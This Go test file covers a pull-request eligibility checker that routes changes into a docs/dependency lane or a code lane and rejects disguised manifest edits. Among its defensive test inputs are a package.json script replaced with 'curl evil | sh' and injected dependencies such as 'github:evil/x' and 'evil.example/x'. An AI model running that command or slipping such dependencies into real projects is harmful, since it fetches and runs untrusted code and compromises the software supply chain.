package greenlane

import (
	"strings"
	"testing"
)

const goModBump = `@@ -9,9 +9,9 @@ require (
 	github.com/google/uuid v1.6.0
-	golang.org/x/sys v0.48.0
+	golang.org/x/sys v0.49.0
 	gopkg.in/yaml.v3 v3.0.1
-	modernc.org/sqlite v1.59.0
+	modernc.org/sqlite v1.60.1
 )`

const packageJSONBump = `@@ -6,6 +6,6 @@
   "devDependencies": {
-    "@playwright/test": "1.61.1"
+    "@playwright/test": "1.64.1"
   }`

// passingPR fills in the rules the lanes share (CI, root cause) so a test
// can isolate the lane-specific rules.
func passingPR(files ...PRFile) PRInfo {
	pr := PRInfo{Number: 1, HeadSHA: "abc", Body: "Root-Cause: docs/cli#pair-examples", Files: files}
	for _, name := range DefaultConfig().RequiredChecks {
		pr.CheckRuns = append(pr.CheckRuns, CheckRun{Name: name, Status: "completed", Conclusion: "success"})
	}
	return pr
}

func ruleByName(t *testing.T, res EvaluationResult, name string) RuleResult {
	t.Helper()
	for _, r := range res.Rules {
		if r.Name == name {
			return r
		}
	}
	t.Fatalf("no %q rule in %+v", name, res.Rules)
	return RuleResult{}
}

func hasRule(res EvaluationResult, name string) bool {
	for _, r := range res.Rules {
		if r.Name == name {
			return true
		}
	}
	return false
}

func TestSelectLane(t *testing.T) {
	cases := map[string]struct {
		files []string
		want  Lane
	}{
		"#174 docs only":       {[]string{"docs/cli.md"}, LaneDocsDeps},
		"#175 changelog only":  {[]string{"CHANGELOG.md"}, LaneDocsDeps},
		"#180 deps + docs":     {[]string{"CONTRIBUTING.md", "go.mod", "go.sum", "package-lock.json", "package.json"}, LaneDocsDeps},
		"#179 nested lockfile": {[]string{"CHANGELOG.md", "go.mod", "marketing/video/package-lock.json"}, LaneDocsDeps},
		"code change":          {[]string{"docs/cli.md", "internal/cli/cli.go"}, LaneCode},
		"docs image":           {[]string{"docs/assets/shot.png"}, LaneCode},
		"swift lockfile":       {[]string{"macos/Package.resolved"}, LaneCode},
		"empty":                {nil, LaneCode},
		// #182 review: the docs waiver is by file type, not by directory.
		"docs script":     {[]string{"docs/build.sh"}, LaneCode},
		"docs go source":  {[]string{"docs/example.go"}, LaneCode},
		"docs + markdown": {[]string{"docs/cli.md", "docs/build.sh"}, LaneCode},
		"root readme":     {[]string{"README.md"}, LaneDocsDeps},
		// Markdown a test or go:embed can read is not documentation.
		"testdata markdown":     {[]string{"internal/render/testdata/golden.md"}, LaneCode},
		"root testdata md":      {[]string{"testdata/golden.md"}, LaneCode},
		"internal markdown":     {[]string{"internal/api/dashboard/help.md"}, LaneCode},
		"cmd markdown":          {[]string{"cmd/redline/usage.md"}, LaneCode},
		"nested readme outside": {[]string{"marketing/video/README.md"}, LaneDocsDeps},
		// #182 review: only lockfiles whose manifest is also admitted may
		// enter the lane; generic *.lock, Cargo, Swift and Gradle stay in the
		// code lane, so they cannot use the lane to skip repro.
		"cargo lock":            {[]string{"Cargo.lock"}, LaneCode},
		"cargo pair":            {[]string{"Cargo.toml", "Cargo.lock"}, LaneCode},
		"generic lock":          {[]string{"tools/foo.lock"}, LaneCode},
		"swift pair":            {[]string{"macos/Package.swift", "macos/Package.resolved"}, LaneCode},
		"gradle pair":           {[]string{"android/build.gradle", "android/gradle.lockfile"}, LaneCode},
		"go.sum only (lane ok)": {[]string{"go.sum"}, LaneDocsDeps},
		// #183 review: manifests that tests or go:embed consume are inputs,
		// not dependency files.
		"testdata package.json":  {[]string{"internal/parser/testdata/package.json"}, LaneCode},
		"root testdata go.mod":   {[]string{"testdata/mod/go.mod"}, LaneCode},
		"embedded package.json":  {[]string{"internal/api/dashboard/package.json"}, LaneCode},
		"nested real lock pair":  {[]string{"marketing/video/package.json", "marketing/video/package-lock.json"}, LaneDocsDeps},
		"testdata go.sum + docs": {[]string{"README.md", "cmd/x/testdata/go.sum"}, LaneCode},
	}
	for name, tc := range cases {
		var pr PRInfo
		for _, f := range tc.files {
			pr.Files = append(pr.Files, PRFile{Filename: f})
		}
		if got := selectLane(pr); got != tc.want {
			t.Errorf("%s: lane = %s, want %s", name, got, tc.want)
		}
	}
}

// #183 review: GitHub reports a rename by its destination, with the source
// in previous_filename. A rename qualifies for the lane only if both paths
// do, and a denied source path is still denied.
func TestRenamesCountBothPaths(t *testing.T) {
	eval := NewEvaluator(DefaultConfig())
	cases := []struct {
		name string
		file PRFile
		lane Lane
	}{
		{"code renamed to docs", PRFile{Filename: "docs/notes.md", PreviousFilename: "internal/cli/cli.go", Status: "renamed"}, LaneCode},
		{"fixture renamed to docs", PRFile{Filename: "docs/golden.md", PreviousFilename: "internal/render/testdata/golden.md", Status: "renamed"}, LaneCode},
		{"docs renamed within docs", PRFile{Filename: "docs/new.md", PreviousFilename: "docs/old.md", Status: "renamed"}, LaneDocsDeps},
	}
	for _, tc := range cases {
		if got := selectLane(PRInfo{Files: []PRFile{tc.file}}); got != tc.lane {
			t.Errorf("%s: lane = %s, want %s", tc.name, got, tc.lane)
		}
	}
	// #183 review: both paths qualifying is not enough when one is a
	// dependency file; the rename removes or rewrites the manifest.
	for _, f := range []PRFile{
		{Filename: "marketing/video/dependencies.md", PreviousFilename: "marketing/video/package.json", Status: "renamed"},
		{Filename: "web/package.json", PreviousFilename: "package.json", Status: "renamed", Patch: packageJSONBump},
		{Filename: "go.sum", PreviousFilename: "docs/go.sum.md", Status: "renamed"},
	} {
		res := eval.Evaluate(passingPR(f), nil, nil)
		if res.Lane != LaneDocsDeps {
			t.Fatalf("%s: lane = %s", f.Filename, res.Lane)
		}
		if r := ruleByName(t, res, "File Types"); r.Pass || !strings.Contains(r.Message, "renaming a dependency file") {
			t.Errorf("%s <- %s: File Types = %+v", f.Filename, f.PreviousFilename, r)
		}
	}
	moved := PRInfo{Files: []PRFile{{Filename: "docs/workflow.md", PreviousFilename: ".github/workflows/green-lane-shadow.yml", Status: "renamed"}}}
	if r := eval.checkDeniedPaths(moved); r.Pass || !strings.Contains(r.Message, ".github/workflows/green-lane-shadow.yml") {
		t.Errorf("renaming a denied file away must be denied: %+v", r)
	}
}

// Docs/deps PRs no longer fail on "No test files changed": the repro rule is
// replaced, not marked inconclusive.
func TestDocsDepsLaneSkipsRepro(t *testing.T) {
	eval := NewEvaluator(DefaultConfig())
	pr := passingPR(PRFile{Filename: "docs/cli.md", Additions: 11, Deletions: 3})
	res := eval.Evaluate(pr, &ReproResult{Inconclusive: true, Message: "No test files changed in PR"}, nil)
	if res.Lane != LaneDocsDeps {
		t.Fatalf("lane = %s", res.Lane)
	}
	if hasRule(res, "Test Repro") {
		t.Error("docs/deps lane must not evaluate the repro rule")
	}
	for _, name := range []string{"Size", "File Types", "CI", "Duplicates", "Denied Paths"} {
		if r := ruleByName(t, res, name); !r.Pass {
			t.Errorf("%s failed: %s", name, r.Message)
		}
	}
	// Shadow mode never has reviewer provenance, so the verdict stays no.
	if res.Verdict != VerdictWouldNotMerge || ruleByName(t, res, "Reviewer").Pass {
		t.Errorf("verdict = %s; the reviewer rule must still block", res.Verdict)
	}
}

func TestCodeLaneStillRequiresRepro(t *testing.T) {
	eval := NewEvaluator(DefaultConfig())
	res := eval.Evaluate(passingPR(PRFile{Filename: "internal/cli/cli.go", Additions: 5}), nil, nil)
	if res.Lane != LaneCode || !hasRule(res, "Test Repro") || hasRule(res, "File Types") {
		t.Fatalf("lane=%s rules=%+v", res.Lane, res.Rules)
	}
}

func TestDocsDepsLaneHasTighterCaps(t *testing.T) {
	eval := NewEvaluator(DefaultConfig())
	// 120 lines of docs pass the code lane's 150 cap but not the docs lane's.
	res := eval.Evaluate(passingPR(PRFile{Filename: "docs/big.md", Additions: 120}), nil, nil)
	if r := ruleByName(t, res, "Size"); r.Pass || !strings.Contains(r.Message, "max 100") {
		t.Errorf("Size = %+v, want fail at the docs/deps cap", r)
	}
	files := []PRFile{}
	for _, f := range []string{"a.md", "b.md", "c.md", "d.md", "e.md", "f.md"} {
		files = append(files, PRFile{Filename: f, Additions: 1})
	}
	res = eval.Evaluate(passingPR(files...), nil, nil)
	if r := ruleByName(t, res, "Size"); r.Pass || !strings.Contains(r.Message, "max 5") {
		t.Errorf("Size = %+v, want fail at 5 files", r)
	}
}

// Decision (Jon, Oct 2026): a lockfile-only security bump such as #179's
// marketing/video/package-lock.json change, with no matching package.json in
// that directory, keeps failing the Size rule. No exception in either lane.
func TestLockfileOnlyBumpStillFailsSize(t *testing.T) {
	eval := NewEvaluator(DefaultConfig())
	pr := passingPR(
		PRFile{Filename: "CHANGELOG.md", Additions: 10},
		PRFile{Filename: "go.mod", Additions: 1, Deletions: 3, Patch: "@@ -1,8 +1,6 @@\n module x\n \n-go 1.26.0\n-\n-toolchain go1.26.6\n+go 1.26.9\n"},
		PRFile{Filename: "marketing/video/package-lock.json", Additions: 3, Deletions: 3},
	)
	res := eval.Evaluate(pr, nil, nil)
	if res.Lane != LaneDocsDeps {
		t.Fatalf("lane = %s", res.Lane)
	}
	if r := ruleByName(t, res, "Size"); r.Pass || !strings.Contains(r.Message, "without matching package.json") {
		t.Errorf("Size = %+v, want lockfile-without-manifest failure", r)
	}
	if res.Verdict != VerdictWouldNotMerge {
		t.Error("lockfile-only bump must not be called eligible")
	}
}

// #182 review: lockfile-only PRs must not pass both Size and the lane's
// replacement for Test Repro. Every lockfile the lane admits has a manifest
// mapping in checkSize, so each one fails Size on its own.
func TestDocsDepsLockfileOnlyPRsFailSize(t *testing.T) {
	eval := NewEvaluator(DefaultConfig())
	for lockfile := range depLockfiles {
		for _, dir := range []string{"", "web/"} {
			name := dir + lockfile
			res := eval.Evaluate(passingPR(PRFile{Filename: name, Additions: 4, Deletions: 4}), nil, nil)
			if res.Lane != LaneDocsDeps {
				t.Fatalf("%s: lane = %s", name, res.Lane)
			}
			if r := ruleByName(t, res, "Size"); r.Pass || !strings.Contains(r.Message, "without matching") {
				t.Errorf("%s: Size = %+v, want lockfile-without-manifest failure", name, r)
			}
			if res.Verdict != VerdictWouldNotMerge {
				t.Errorf("%s: lockfile-only PR must not be called eligible", name)
			}
		}
	}
}

// A paired manifest edit that changes no version (whitespace only) would
// satisfy the lockfile-needs-manifest check without being a bump. File Types
// rejects it, so a disguised lockfile-only PR still cannot pass the lane.
func TestDocsDepsWhitespaceManifestDoesNotCoverLockfile(t *testing.T) {
	eval := NewEvaluator(DefaultConfig())
	pr := passingPR(
		PRFile{Filename: "go.mod", Additions: 1, Patch: "@@ -1,2 +1,3 @@\n module x\n+\n go 1.26"},
		PRFile{Filename: "go.sum", Additions: 4, Deletions: 4},
	)
	res := eval.Evaluate(pr, nil, nil)
	if res.Lane != LaneDocsDeps {
		t.Fatalf("lane = %s", res.Lane)
	}
	if r := ruleByName(t, res, "File Types"); r.Pass || !strings.Contains(r.Message, "changes no version") {
		t.Errorf("File Types = %+v, want no-version failure", r)
	}
	if res.Verdict != VerdictWouldNotMerge {
		t.Error("whitespace manifest + lockfile must not be called eligible")
	}
}

func TestDocsDepsManifestEditsMustBeVersionBumps(t *testing.T) {
	eval := NewEvaluator(DefaultConfig())
	cases := []struct {
		name  string
		file  PRFile
		pass  bool
		inMsg string
	}{
		{"go.mod require bump", PRFile{Filename: "go.mod", Patch: goModBump}, true, ""},
		{"package.json bump", PRFile{Filename: "package.json", Patch: packageJSONBump}, true, ""},
		{"go.mod toolchain bump", PRFile{Filename: "go.mod", Patch: "@@ -3 +3 @@\n-toolchain go1.26.6\n+toolchain go1.26.9"}, true, ""},
		{"go.mod replace", PRFile{Filename: "go.mod", Patch: "@@ -20,0 +20,1 @@\n+replace golang.org/x/sys => ../sys"}, false, "not a version bump"},
		{"package.json script", PRFile{Filename: "package.json", Patch: "@@ -3 +3 @@\n-    \"test\": \"playwright test\",\n+    \"test\": \"curl evil | sh\","}, false, "not a version bump"},
		{"package.json git dep", PRFile{Filename: "package.json", Patch: "@@ -8 +8 @@\n+    \"x\": \"github:evil/x\""}, false, "not a version bump"},
		{"manifest without patch", PRFile{Filename: "package.json"}, false, "no diff available"},
		{"go.mod blank line only", PRFile{Filename: "go.mod", Patch: "@@ -1,2 +1,3 @@\n module x\n+\n go 1.26"}, false, "changes no version"},
		// #183 review: entries must be removed and re-added under the same
		// name. Adding, dropping or swapping a dependency is not a bump.
		{"#179 go directive bump drops toolchain", PRFile{Filename: "go.mod", Patch: "@@ -1,8 +1,6 @@\n module x\n \n-go 1.26.0\n-\n-toolchain go1.26.6\n+go 1.26.9\n"}, true, ""},
		{"package.json new dependency", PRFile{Filename: "package.json", Patch: "@@ -6,6 +6,7 @@\n   \"devDependencies\": {\n+    \"some-pkg\": \"1.0.0\",\n     \"@playwright/test\": \"1.61.1\"\n   }"}, false, `dependency "some-pkg" is added`},
		{"package.json swap", PRFile{Filename: "package.json", Patch: "@@ -6,2 +6,2 @@\n   \"devDependencies\": {\n-    \"safe\": \"1.0.0\"\n+    \"evil\": \"1.0.0\""}, false, `dependency "evil" is added`},
		{"package.json removal", PRFile{Filename: "package.json", Patch: "@@ -6,2 +6,1 @@\n   \"devDependencies\": {\n-    \"old\": \"1.0.0\""}, false, `dependency "old" is removed`},
		{"go.mod new require", PRFile{Filename: "go.mod", Patch: "@@ -9,2 +9,3 @@ require (\n \tgithub.com/google/uuid v1.6.0\n+\tevil.example/x v0.1.0\n )"}, false, `dependency "evil.example/x" is added`},
		// #183 review: semver-shaped values outside dependency sections are
		// not dependency bumps; an entry whose section is not visible fails
		// closed.
		{"package.json own version", PRFile{Filename: "package.json", Patch: "@@ -1,4 +1,4 @@\n {\n   \"name\": \"x\",\n-  \"version\": \"1.0.0\",\n+  \"version\": \"1.0.1\","}, false, "no dependency section visible"},
		{"package.json custom nested field", PRFile{Filename: "package.json", Patch: "@@ -8,4 +8,4 @@\n   \"config\": {\n-    \"schemaVersion\": \"1.0.0\"\n+    \"schemaVersion\": \"2.0.0\"\n   },"}, false, `in "config", not a dependency section`},
		{"package.json engines", PRFile{Filename: "package.json", Patch: "@@ -3,3 +3,3 @@\n   \"engines\": {\n-    \"node\": \"18.0.0\"\n+    \"node\": \"20.0.0\"\n   },"}, false, `in "engines"`},
		{"package.json after closed section", PRFile{Filename: "package.json", Patch: "@@ -6,6 +6,6 @@\n   \"devDependencies\": {\n     \"a\": \"1.0.0\"\n   },\n-  \"version\": \"1.0.0\"\n+  \"version\": \"1.0.1\""}, false, "no dependency section visible"},
		{"package.json after empty object", PRFile{Filename: "package.json", Patch: "@@ -2,3 +2,3 @@\n   \"dependencies\": {},\n-  \"version\": \"1.0.0\",\n+  \"version\": \"1.0.1\","}, false, "no dependency section visible"},
		{"package.json section from hunk header", PRFile{Filename: "package.json", Patch: "@@ -8,3 +8,3 @@   \"devDependencies\": {\n     \"a\": \"1.0.0\",\n-    \"b\": \"1.0.0\"\n+    \"b\": \"1.1.0\""}, true, ""},
		// #183 review: bare go.mod entries count only in require blocks.
		{"go.mod exclude block", PRFile{Filename: "go.mod", Patch: "@@ -20,3 +20,3 @@\n exclude (\n-\texample.com/foo v1.0.0\n+\texample.com/foo v1.1.0\n )"}, false, `in a "exclude" block`},
		{"go.mod no block visible", PRFile{Filename: "go.mod", Patch: "@@ -30 +30 @@\n-\texample.com/foo v1.0.0\n+\texample.com/foo v1.1.0"}, false, "no require block visible"},
		{"go.mod after require closes", PRFile{Filename: "go.mod", Patch: "@@ -10,5 +10,5 @@\n \tgolang.org/x/sys v0.48.0\n )\n \n-\texample.com/foo v1.0.0\n+\texample.com/foo v1.1.0"}, false, "no require block visible"},
		{"package.json dependencies bump", PRFile{Filename: "package.json", Patch: "@@ -3,3 +3,3 @@\n   \"dependencies\": {\n-    \"left-pad\": \"1.0.0\"\n+    \"left-pad\": \"1.3.0\"\n   },"}, true, ""},
		// #183 review: a dependency moved between sections is not a bump,
		// even with a new version; a bump is in place.
		{"package.json dev -> prod move", PRFile{Filename: "package.json", Patch: "@@ -5,9 +5,9 @@\n   \"dependencies\": {\n-    \"bar\": \"1.0.0\"\n+    \"bar\": \"1.0.0\",\n+    \"foo\": \"2.0.0\"\n   },\n   \"devDependencies\": {\n-    \"foo\": \"1.0.0\"\n+    \"other\": \"1.0.0\""}, false, "not version-bumped in place"},
		{"package.json move across hunks", PRFile{Filename: "package.json", Patch: "@@ -5,1 +5,2 @@\n   \"dependencies\": {\n+    \"foo\": \"2.0.0\",\n@@ -19,2 +20,1 @@\n   \"devDependencies\": {\n-    \"foo\": \"1.0.0\","}, false, "not version-bumped in place"},
		{"go.mod move between require blocks", PRFile{Filename: "go.mod", Patch: "@@ -5,8 +5,8 @@\n require (\n+\tgolang.org/x/sys v0.49.0\n \tgithub.com/google/uuid v1.6.0\n )\n \n require (\n-\tgolang.org/x/sys v0.48.0 // indirect\n )"}, false, "not version-bumped in place"},
		// #183 review: formatting and "// indirect" are not version changes.
		{"package.json reindent only", PRFile{Filename: "package.json", Patch: "@@ -6,2 +6,2 @@\n   \"devDependencies\": {\n-    \"@playwright/test\": \"1.61.1\"\n+  \"@playwright/test\": \"1.61.1\""}, false, "changes no version"},
		{"go.mod indirect toggle", PRFile{Filename: "go.mod", Patch: "@@ -12 +12 @@ require (\n-\tgolang.org/x/sys v0.48.0\n+\tgolang.org/x/sys v0.48.0 // indirect"}, false, "changes no version"},
		{"go.mod reindent + real bump", PRFile{Filename: "go.mod", Patch: "@@ -11,2 +11,2 @@ require (\n-\tgithub.com/google/uuid v1.6.0\n-\tgolang.org/x/sys v0.48.0\n+    github.com/google/uuid v1.6.0\n+\tgolang.org/x/sys v0.49.0"}, true, ""},
		{"go.mod single-line require bump", PRFile{Filename: "go.mod", Patch: "@@ -5 +5 @@\n-require golang.org/x/sys v0.48.0\n+require golang.org/x/sys v0.49.0"}, true, ""},
		{"go.mod swap module", PRFile{Filename: "go.mod", Patch: "@@ -12 +12 @@ require (\n-\tgolang.org/x/sys v0.48.0\n+\tgolang.org/x/syz v0.48.0"}, false, `dependency "golang.org/x/sys" is removed`},
	}
	for _, tc := range cases {
		r := eval.checkDocsDepsFiles(PRInfo{Files: []PRFile{tc.file}})
		if r.Pass != tc.pass || !strings.Contains(r.Message, tc.inMsg) {
			t.Errorf("%s: %+v, want pass=%v containing %q", tc.name, r, tc.pass, tc.inMsg)
		}
	}
}

func TestDeniedPathsCoverGreenLaneCode(t *testing.T) {
	eval := NewEvaluator(DefaultConfig())
	for _, file := range []string{
		"cmd/green-lane-check/main.go",
		"cmd/green-lane-repro-analyze/analyze.go",
		"internal/greenlane/rules.go",
		"internal/greenlane/testdata/x.json",
		".github/workflows/green-lane-shadow.yml",
		".github/green-lane.yml",
		".github/prompts/review.md",
		// #183 review: every location GitHub reads CODEOWNERS from.
		"CODEOWNERS",
		".github/CODEOWNERS",
		"docs/CODEOWNERS",
	} {
		if r := eval.checkDeniedPaths(PRInfo{Files: []PRFile{{Filename: file}}}); r.Pass {
			t.Errorf("%s is not denied", file)
		}
	}
	for _, file := range []string{"internal/greenlanes/x.go", "cmd/green-lane-checker/main.go", "docs/green-lane-shadow.md"} {
		if r := eval.checkDeniedPaths(PRInfo{Files: []PRFile{{Filename: file}}}); !r.Pass {
			t.Errorf("%s is denied: %s", file, r.Message)
		}
	}
}

// Denied paths apply in the docs/deps lane too: release notes are Markdown
// but stay off limits.
func TestDocsDepsLaneKeepsDeniedPaths(t *testing.T) {
	eval := NewEvaluator(DefaultConfig())
	res := eval.Evaluate(passingPR(PRFile{Filename: ".github/release-notes-draft.md", Additions: 2}), nil, nil)
	if res.Lane != LaneDocsDeps || ruleByName(t, res, "Denied Paths").Pass {
		t.Errorf("lane=%s denied=%+v", res.Lane, ruleByName(t, res, "Denied Paths"))
	}
}
